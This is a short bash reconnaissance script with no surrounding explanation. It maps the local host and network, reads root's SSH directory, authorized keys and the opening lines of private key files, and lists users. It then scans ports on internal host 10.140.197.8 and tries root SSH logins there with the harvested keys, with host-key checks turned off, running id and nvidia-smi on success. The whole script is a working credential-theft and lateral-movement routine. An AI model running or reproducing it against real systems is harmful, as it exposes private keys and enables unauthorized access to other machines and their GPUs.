set -u
echo "== host $(hostname -s) uid=$(id -u) $(date -u +%FT%TZ)"
echo "== inet"; ip -4 a 2>/dev/null | grep -E 'inet ' | head -8
echo "== route"; ip route 2>/dev/null | head -6
echo "== sshbin"; ssh -V 2>&1 | head -2
echo "== selfssh"; ss lntp 2>/dev/null | grep -E ':22|:5900|:10250' | head -6
echo "== rootssh"; ls -la /root/.ssh/ 2>&1 | head -12
echo "== authkeys"; cat /root/.ssh/authorized_keys 2>/dev/null | cut -c1-120 | head -8
echo "== privkeys"; for f in /root/.ssh/id_*; do [ -f "$f" ] && { echo "### $f"; head -2 "$f"; }; done 2>&1
echo "== users"; getent passwd 2>/dev/null | awk -F: '$3>=1000||$3==0{print $1":"$3":"$6}' | head -10
echo "== tcp to 10.140.197.8"
for p in 22 80 443 5900 2375 10250; do timeout 4 bash -c "echo > /dev/tcp/10.140.197.8/$p" 2>/dev/null && echo "8:$p OPEN" || echo "8:$p closed"; done
echo "== ssh try"
for k in /root/.ssh/id_ed25519 /root/.ssh/id_rsa; do [ -f "$k" ] && { echo "-- $k"; timeout 18 ssh -i "$k" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o ConnectTimeout=6 root@10.140.197.8 'id; hostname; nvidia-smi -L | head -3' 2>&1 | tail -6; }; done
echo CMDRECON-DONE
